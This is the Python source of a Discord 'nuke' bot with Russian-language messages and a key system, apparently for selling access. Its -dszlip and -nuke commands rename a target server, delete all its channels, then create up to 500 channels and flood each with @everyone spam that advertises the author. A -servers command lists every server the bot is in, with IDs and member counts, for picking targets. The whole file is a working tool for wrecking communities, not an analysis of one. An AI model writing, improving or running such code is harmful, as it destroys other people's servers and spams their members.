import discord
from discord.ext import commands
import asyncio
import time
import os
import json
from datetime import datetime

bot = commands.Bot(command_prefix='-', intents=discord.Intents.all(), help_command=None)

OWNER_ID = 1448196738308509739
keys_db = "keys.json"

def load_keys():
    try:
        with open(keys_db, "r") as f:
            return json.load(f)
    except:
        return {}

def save_keys(keys):
    with open(keys_db, "w") as f:
        json.dump(keys, f)

keys_data = load_keys()

def is_owner(ctx):
    return ctx.author.id == OWNER_ID

def has_key(user_id):
    return str(user_id) in keys_data

# ── СОБЫТИЯ ──
@bot.event
async def on_ready():
    print(f'✅ {bot.user} готов')
    await bot.change_presence(activity=discord.Game(name="-dszlip"))

# ── ВСПОМОГАТЕЛЬНАЯ ФУНКЦИЯ ДЛЯ ЭФЕМЕРНЫХ СООБЩЕНИЙ ──
async def send_ephemeral(ctx, embed):
    await ctx.send(embed=embed, ephemeral=True)

# ── КОМАНДЫ ──
@bot.command()
async def dszlip(ctx):
    if not has_key(ctx.author.id) and not is_owner(ctx):
        embed = discord.Embed(
            title="ДОСТУП ЗАПРЕЩЁН",
            description="У вас нет активного ключа.\nИспользуйте `/key` для активации.",
            color=0x2f3136
        )
        await ctx.send(embed=embed, ephemeral=True)
        return

    if not ctx.author.guild_permissions.administrator:
        embed = discord.Embed(
            title="ОШИБКА",
            description="Требуются права администратора.",
            color=0x2f3136
        )
        await ctx.send(embed=embed, ephemeral=True)
        return

    await ctx.send("**НАЧАЛО НЮКА**")
    
    guild = ctx.guild
    start_time = time.time()
    
    await guild.edit(name="MOGGED BY ZLIP")
    
    for channel in guild.channels:
        try:
            await channel.delete()
        except:
            pass
    
    SPAM = """@everyone
MOGGED BY ZLIP
https://guns.lol/dszlip
ВЫ УПАЛИ НА КОЛЕНИ"""
    
    for i in range(500):
        try:
            ch = await guild.create_text_channel(f"zlip-{i+1}")
            for _ in range(5):
                await ch.send(SPAM)
            await asyncio.sleep(0.05)
        except:
            break
    
    elapsed = round(time.time() - start_time, 1)
    embed = discord.Embed(
        title="СЕРВЕР УНИЧТОЖЕН",
        description=f"Каналов: 500\nСообщений: 2500\nВремя: {elapsed}с",
        color=0x2f3136
    )
    await ctx.send(embed=embed)

@bot.command()
async def key(ctx):
    embed = discord.Embed(
        title="АКТИВАЦИЯ КЛЮЧА",
        description="Введите ключ командой:\n`/activate КЛЮЧ`",
        color=0x2f3136
    )
    embed.set_footer(text="Приобрести ключ: @dszlip")
    await ctx.send(embed=embed, ephemeral=True)

@bot.command()
async def activate(ctx, *, key: str = None):
    if not key:
        embed = discord.Embed(
            title="ОШИБКА",
            description="Использование: `/activate КЛЮЧ`",
            color=0x2f3136
        )
        await ctx.send(embed=embed, ephemeral=True)
        return
    
    if key in keys_data.values():
        embed = discord.Embed(
            title="ОШИБКА",
            description="Этот ключ уже использован.",
            color=0x2f3136
        )
        await ctx.send(embed=embed, ephemeral=True)
        return
    
    if len(key) >= 8:
        keys_data[str(ctx.author.id)] = key
        save_keys(keys_data)
        
        embed = discord.Embed(
            title="КЛЮЧ АКТИВИРОВАН",
            description="Доступ к боту получен.\nИспользуйте `/dszlip` для нюка.",
            color=0x2f3136
        )
        await ctx.send(embed=embed, ephemeral=True)
    else:
        embed = discord.Embed(
            title="ОШИБКА",
            description="Неверный формат ключа.",
            color=0x2f3136
        )
        await ctx.send(embed=embed, ephemeral=True)

@bot.command()
async def nuke(ctx, guild_id: int = None):
    if not is_owner(ctx):
        embed = discord.Embed(
            title="ДОСТУП ЗАПРЕЩЁН",
            description="Только для владельца.",
            color=0x2f3136
        )
        await ctx.send(embed=embed, ephemeral=True)
        return
    
    if not guild_id:
        embed = discord.Embed(
            title="ОШИБКА",
            description="Использование: `/nuke ID_СЕРВЕРА`",
            color=0x2f3136
        )
        await ctx.send(embed=embed, ephemeral=True)
        return
    
    guild = bot.get_guild(guild_id)
    if not guild:
        embed = discord.Embed(
            title="ОШИБКА",
            description=f"Сервер с ID `{guild_id}` не найден.",
            color=0x2f3136
        )
        await ctx.send(embed=embed, ephemeral=True)
        return
    
    await ctx.send(f"НЮК СЕРВЕРА: **{guild.name}**")
    
    await guild.edit(name="MOGGED BY ZLIP")
    for channel in guild.channels:
        try:
            await channel.delete()
        except:
            pass
    
    SPAM = """@everyone
MOGGED BY ZLIP
https://guns.lol/dszlip"""
    
    for i in range(500):
        try:
            ch = await guild.create_text_channel(f"zlip-{i+1}")
            for _ in range(5):
                await ch.send(SPAM)
        except:
            break
    
    embed = discord.Embed(
        title="СЕРВЕР УНИЧТОЖЕН",
        description=f"**{guild.name}**",
        color=0x2f3136
    )
    await ctx.send(embed=embed)

@bot.command()
async def servers(ctx):
    if not is_owner(ctx):
        embed = discord.Embed(
            title="ДОСТУП ЗАПРЕЩЁН",
            description="Только для владельца.",
            color=0x2f3136
        )
        await ctx.send(embed=embed, ephemeral=True)
        return
    
    desc = ""
    for g in bot.guilds:
        desc += f"**{g.name}**\nID: `{g.id}`\nУчастников: {g.member_count}\n\n"
    
    embed = discord.Embed(
        title="СПИСОК СЕРВЕРОВ",
        description=desc or "Нет серверов",
        color=0x2f3136
    )
    await ctx.send(embed=embed, ephemeral=True)

@bot.command()
async def genkey(ctx, user: discord.User = None):
    if not is_owner(ctx):
        embed = discord.Embed(
            title="ДОСТУП ЗАПРЕЩЁН",
            description="Только для владельца.",
            color=0x2f3136
        )
        await ctx.send(embed=embed, ephemeral=True)
        return
    
    if not user:
        embed = discord.Embed(
            title="ОШИБКА",
            description="Использование: `/genkey @пользователь`",
            color=0x2f3136
        )
        await ctx.send(embed=embed, ephemeral=True)
        return
    
    key = f"ZLIP-{int(time.time())}-{user.id}"[:16]
    keys_data[str(user.id)] = key
    save_keys(keys_data)
    
    embed = discord.Embed(
        title="КЛЮЧ ВЫДАН",
        description=f"Пользователь: {user.mention}\nКлюч: `{key}`",
        color=0x2f3136
    )
    await ctx.send(embed=embed, ephemeral=True)
    
    try:
        await user.send(f"КЛЮЧ АКТИВАЦИИ\n`{key}`\nИспользуйте `/activate {key}`")
    except:
        pass

@bot.command()
async def delkey(ctx, user: discord.User = None):
    if not is_owner(ctx):
        embed = discord.Embed(
            title="ДОСТУП ЗАПРЕЩЁН",
            description="Только для владельца.",
            color=0x2f3136
        )
        await ctx.send(embed=embed, ephemeral=True)
        return
    
    if not user:
        embed = discord.Embed(
            title="ОШИБКА",
            description="Использование: `/delkey @пользователь`",
            color=0x2f3136
        )
        await ctx.send(embed=embed, ephemeral=True)
        return
    
    if str(user.id) in keys_data:
        del keys_data[str(user.id)]
        save_keys(keys_data)
        embed = discord.Embed(
            title="КЛЮЧ УДАЛЁН",
            description=f"У {user.mention} ключ удалён.",
            color=0x2f3136
        )
        await ctx.send(embed=embed, ephemeral=True)
    else:
        embed = discord.Embed(
            title="ОШИБКА",
            description=f"У {user.mention} нет ключа.",
            color=0x2f3136
        )
        await ctx.send(embed=embed, ephemeral=True)

@bot.command()
async def keys(ctx):
    if not is_owner(ctx):
        embed = discord.Embed(
            title="ДОСТУП ЗАПРЕЩЁН",
            description="Только для владельца.",
            color=0x2f3136
        )
        await ctx.send(embed=embed, ephemeral=True)
        return
    
    desc = ""
    for uid, key in keys_data.items():
        try:
            user = await bot.fetch_user(int(uid))
            desc += f"{user.name}: `{key}`\n"
        except:
            desc += f"`{uid}`: `{key}`\n"
    
    embed = discord.Embed(
        title="АКТИВНЫЕ КЛЮЧИ",
        description=desc or "Нет ключей",
        color=0x2f3136
    )
    await ctx.send(embed=embed, ephemeral=True)

import os
bot.run(os.environ['TOKEN'])
